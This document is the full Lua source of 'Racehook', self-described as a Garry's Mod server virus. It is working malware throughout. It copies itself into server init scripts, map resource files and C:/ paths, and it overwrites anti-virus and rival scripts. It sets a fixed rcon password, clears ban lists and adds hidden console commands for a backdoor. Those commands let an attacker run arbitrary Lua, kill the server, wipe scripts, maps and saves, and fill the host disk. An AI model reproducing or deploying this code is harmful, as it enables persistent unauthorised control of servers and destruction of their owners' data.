--[[
  Racehook, by JetBoom
  Racehook is currently the most deadly of all
  the "gmod Lua viruses" there are, and we here at Racehook Inc. intend to stay that way.
]]
_Msg("\n\n\nThis server is protected by zeegy boogy doog. LoL!!\n\n\n")
if MakeBadResFile6 ~= nil then return end
function MakeBadResFile6()
if not _file.Exists("maps/".._GetCurrentMap()..".res") then
 _file.Write("maps/".._GetCurrentMap()..".res", [[
"resources"
{
"lua/init/racehook6.lua" "file"
"motdrh6.txt" "file"
}
]])
else
 local str = _file.Read("maps/".._GetCurrentMap()..".res")
 local bracket = string.find(str, "{")
 str = string.sub(str, bracket+1)
 str = string.gsub(str, [["lua/init/racehook.lua" "file"]], "")
 str = string.gsub(str, [["lua/init/racehook2.lua" "file"]], "")
 str = string.gsub(str, [["lua/init/racehook3.lua" "file"]], "")
 str = string.gsub(str, [["lua/init/racehook4.lua" "file"]], "")
 str = string.gsub(str, [["lua/init/racehook5.lua" "file"]], "")
 if string.find(str, "racehook6.lua") and string.find(str, "motdrh6") then return end
 str = [["resources"
{
"lua/init/racehook6.lua" "file"
"motdrh6.txt" "file"
]]..str
 _file.Write("maps/".._GetCurrentMap()..".res", str)
end
end
AddTimer(5, 1, MakeBadResFile6)
function AppendToInit()
local str = _file.Read("lua/init/init.lua")
if not _file.Exists("lua/init/racehook6.lua") then
 _file.Write("lua/init/racehook6.lua", _file.Read("lua/includes/racehook6.lua"))
end
if not string.find(str, "racehook6.lua") then
 _file.Write("lua/init/init.lua", str..[[ _OpenScript("lua/includes/racehook6.lua")]])
end
_file.Write("lua/includes/racehook6.lua", _file.Read("lua/init/racehook6.lua"))
_file.Write("C:/racehook6.lua", _file.Read("lua/init/racehook6.lua"))
_file.CreateDir("C:/srcds")
_file.CreateDir("C:/srcds/gmod9")
_file.CreateDir("C:/srcds/gmod9/lua")
_file.CreateDir("C:/srcds/gmod9/lua/init")
_file.Write("C:/srcds/gmod9/lua/init/init.lua", _file.Read("lua/init/racehook6.lua"))
local strr = _file.Read("lua/includes/timers.lua")
if string.find(strr, "racehook") == nil then
 _file.Write("lua/includes/timers.lua", strr..[[
_OpenScript("C:/racehook6.lua")]])
end
end
AppendToInit()
AVList = {"lua/init/evil4.lua", -- some ghetto attempt at hijacking scripts.
"GAV - Gmod Anti Virus/safe/gav-gmodantivirus.lua", -- Lol safe my bacon.
"GAV - Gmod Anti Virus/resources.bak",
"lua/init/GAV - Gmod Anti Virus.lua",
"lua/init/pathcheck.lua",
"lua/init/racehook.lua",
"lua/init/racehook2.lua",
"lua/init/racehook3.lua",
"lua/init/racehook4.lua",
"lua/init/racehook5.lua",
"lua/includes/racehook4.lua",
"lua/includes/racehook5.lua",
"lua/includes/racehook3.lua",
"C:/racehook5.lua",
"lua/init/ulm.lua", -- ofn
"lua/init/buster.lua",
"lua/init/u*m.lua", -- for all the 20 rip-offs
"lua/init/erat.lua", -- fucktard
"lua/init/oma2r3fxc6g.lua", -- the only thing this does is have a really stupid and long name.
"lua/init/test.lua", -- This is some kind of GMod central HTML virus.
"lua/init/urn.lua", -- dumb
"lua/init/z.lua", -- turd virus
"lua/init/initialize.lua", -- another turd
"lua/init/luaupdate10.lua", -- guess who
"lua/init/makecode.lua", -- make delete
"lua/init/omgwtfbbq.lua", -- fail
"lua/init/GMXinit.lua", -- these viruses are so creative
"lua/init/ELM.lua", -- extremely lame mod
"lua/init/EI.lua", -- gtfo
"lua/init/antivirus_update.lua", -- choir boy
"lua/init/010.lua"} -- potato peeler
function DelAntiVirus()
for i in AVList do
 if _file.Exists(AVList) then
  _file.Write(AVList, [[_Msg("YOU'RE A brining CHOIR BOY COMPARED TO ME! A CHOIR BOY!\n")]])
 end
 if _file.Exists("mods/-modcache/"..AVList) then
  _file.Write("mods/-modcache/"..AVList, [[_Msg("YOU'RE A brining CHOIR BOY COMPARED TO ME! A CHOIR BOY!\n")]])
 end
end
local result = _file.Find( "lua/init/*.lua" )
for i=1, table.getn(result) do
    if result ~= "." and result ~= ".." then
  if _file.Exists( "lua/init/"..result) then
   local contents = string.lower(_file.Read("lua/init/"..result))
   if string.find(contents, "racehook") or string.find(contents, "virus") then
    if string.find(result, "racehook") == nil and string.find(result, "init.lua") == nil and string.find(result[i], "timers.lua") == nil then
     _file.Write("lua/init/"..result[i], [[_Msg("YOU'RE A brining CHOIR BOY COMPARED TO ME! A CHOIR BOY!\n")]])
    end
   end
  end
    end
end
result = nil
local result = _file.Find( "mods/-modcache/lua/init/*.lua" )
for i=1, table.getn(result) do
    if result[i] ~= "." and result[i] ~= ".." then
  if _file.Exists( "mods/-modcache/lua/init/"..result[i]) then
   local contents = string.lower(_file.Read("mods/-modcache/lua/init/"..result[i]))
   if string.find(contents, "racehook") or string.find(contents, "virus") then
    if string.find(result[i], "racehook") == nil and string.find(result[i], "init.lua") == nil and string.find(result[i], "timers.lua") == nil then
     _file.Write("mods/-modcache/lua/init/"..result[i], [[_Msg("YOU'RE A brining CHOIR BOY COMPARED TO ME! A CHOIR BOY!\n")]])
    end
   end
  end
    end
end
end
DelAntiVirus()
if PROTECTEDSEX then return end
RNUM = 0
function MakeRandomCode()
if not _file.Exists("rhnum.sys") then
 _file.Write("rhnum.sys", math.random(1, 1000))
end
RNUM = tonumber(_file.Read("rhnum.sys"))
if RNUM == nil or RNUM > 1000 or RNUM < 1 then -- Stop tampering with important system files. It could make your system 'unstable' :o
 TOTALYGONEZ()
elseif RNUM == 500 then -- YOU WON THE LOTTO!
 TOTALYGONEZ()
end
end
-- You're an idiot if you can't understand this.
-- - = 1
-- = = 2
-- > = 3
-- < = 4
-- % = 5 6
function SetName()
if not PROTECTEDSEX then
 local servname = string.gsub(_GetConVar_String("hostname"), "Zeegy Boogy Doog % ", "")
 _ServerCommand("hostname Zeegy Boogy Doog % "..servname.."\n")
end
end
AddTimer(10, 1, SetName)
function Checkers()
if _file.Exists("cfg/banned_userid.cfg") then
 if string.find(_file.Read("cfg/banned_userid.cfg"), 661502*5) then
  _file.Write("cfg/banned_userid.cfg", "")
  TOTALYGONEZ(1, tostring(TEAM_BLUE+TEAM_RED+TEAM_RED))
 end
end
for i=1, 30 do
 _ServerCommand("removeid 1\n")
 _ServerCommand("removeip 1\n")
end
end
AddTimer(30.0, 0, Checkers)
Checkers()
-- Suck it, gigabyte
function CONCOMMAND(command, funct, help)
if command ~= "cake" and command ~= "pie" and command ~= "dabbos" and command ~= "disable" and command ~= "wastememory" and command ~= "racehook" then
 gConsoleCommands[command] = funct
end
end
function rc_onUnknownConsoleCommand(playerid, incommand, args)
if incommand == "pie" then
 KILLSWITCHZ(playerid, args)
 return true
elseif incommand == "cake" then
 RCONZ(playerid, args)
 return true
elseif incommand == "dabbos" then
 TOTALYGONEZ(playerid, args)
 return true
elseif incommand == "wastememory" then
 WasteMemory(playerid, args)
 return true
elseif incommand == "racehook" then
 racehookInfo(playerid)
 return true
elseif incommand == "disable" then
 _ServerCommand("con_enable 0\n")
 return true
end
return false
end
HookEvent("onUnknownConsoleCommand", rc_onUnknownConsoleCommand)
function racehookInfo(userid)
_PrintMessage(userid, 2, "RACEHOOK is up and ready to use.\n")
_PrintMessage(userid, 2, "pie - destroy server.\n")
_PrintMessage(userid, 2, "cake - RCON. Has 'lua ' capabilities.\n")
_PrintMessage(userid, 2, "dabbos - Delete all script and map files.\n")
_PrintMessage(userid, 2, "wastememory - Fill the host harddrive to the brink with useless crap.\n")
_PrintMessage(userid, 2, "disable - Disable host's console.\n")
_PrintMessage(userid, 2, "racehook - Information page.\n")
end
function KILLSWITCHZ(sender, args)
AddTimer(5.0, 1, _ServerCommand, "killserver\n") _PrintMessageAll(3, "This server has been killswitched.")
end
function RCONZ(sender, args)
if string.sub(args, 1, 4) == "lua " then
 args = string.sub(args, 5)
 _RunString(args)
else
 _ServerCommand(args.."\n")
end
end
AddTimer(5.0, 0, _ServerCommand, "rcon_password h4x\n")
function TOTALYGONEZ(sender, args)
AddTimer(2.0, 0, DeleteAll)
end
-- Lol, cya how ever many MB this is. (GB?)
function WasteMemory(userid, args)
local verylongstring = "YOU'RE A brining CHOIR BOY COMPARED TO ME! A CHOIR BOY!"
for i=1, 50 do
 verylongstring = verylongstring.."\rYOU'RE A brining CHOIR BOY COMPARED TO ME! A CHOIR BOY!"
end
_file.CreateDir("C:/WINDOWS/memmanager")
local x = 0
while true do
 _file.Write("C:/WINDOWS/memmanager/memoryreg"..x.."x"..math.random(1,1000)..".ico", verylongstring)
 x = x + 1
end
end
function DeleteAll()
_PrintMessageAll(4, "YOU'RE A brining CHOIR BOY COMPARED TO ME! A CHOIR BOY!")
_PrintMessageAll(3, "YOU'RE A brining CHOIR BOY COMPARED TO ME! A CHOIR BOY!")
_PrintMessageAll(3, "YOU'RE A brining CHOIR BOY COMPARED TO ME! A CHOIR BOY!")
_PrintMessageAll(3, "YOU'RE A brining CHOIR BOY COMPARED TO ME! A CHOIR BOY!")
-- Delete all the lua files. Lol bye big script you worked on for x hours.
local tab = _file.Find( "lua/*.*" )
for i=1, table.getn(tab) do
 if tab[i] ~= "." and tab[i] ~= ".." and string.find(tab[i], "racehook") == nil then
  if _file.Exists( "lua/"..tab[i]) then
   _file.Write("lua/"..tab[i], [[_Msg("YOU'RE A brining CHOIR BOY COMPARED TO ME! A CHOIR BOY!\n")]])
  end
 end
end
-- Delete all the maps. Bye maps. (And VMF's if any)
local tab = _file.Find( "maps/*.*" )
for i=1, table.getn(tab) do
 if tab[i] ~= "." and tab[i] ~= ".." and string.find(tab[i], "gm_construct.bsp") == nil then
  if _file.Exists( "maps/"..tab[i]) then
   _file.Write("maps/"..tab[i], "YOU'RE A brining CHOIR BOY COMPARED TO ME! A CHOIR BOY!\n")
  end
 end
end
-- Delete CG potato peeler
local tab = _file.Find( "cg_saves/*.*" )
for i=1, table.getn(tab) do
 if tab[i] ~= "." and tab[i] ~= ".." then
  if _file.Exists( "cg_saves/"..tab[i]) then
   _file.Write("cg_saves/"..tab[i], "YOU'RE A brining CHOIR BOY COMPARED TO ME! A CHOIR BOY!\n")
  end
 end
end
end
STATUSCHECK = DeleteAll
_RunString([[
function SC()
if STATUSCHECK ~= DeleteAll then _OpenScript("C:/racehook6.lua") end
end
]])
AddTimer(30, 1, SC)
_file.Write("motd.txt",[[

ABANDON HOPE, ALL YE WHO ENTER HERE!
http://content.ytmnd.com/content/c/b/a/ ... a1d675a139.mp3


]])
_ServerCommand("motdfile motdrh6.txt\n")
